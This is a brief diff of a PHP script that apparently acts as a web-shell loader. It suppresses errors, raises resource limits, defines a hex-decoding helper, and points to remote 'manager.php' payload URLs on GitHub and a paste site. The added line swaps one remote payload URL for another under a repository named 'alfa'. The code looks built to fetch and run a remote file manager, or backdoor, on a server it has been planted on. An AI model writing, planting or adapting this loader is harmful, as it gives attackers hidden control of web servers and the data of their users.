@@ -5,7 +5,7 @@ error_reporting(0);
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
 
-$u = 'https://raw.githubusercontent.com/tangsel1928/gecko/refs/heads/main/manager.php';
+$u = 'https://raw.githubusercontent.com/tangsel1928/alfa/refs/heads/main/manager.php';
 $uFb = 'https://paste.myconan.net/677980.txt';
 
 function _fx($hex)
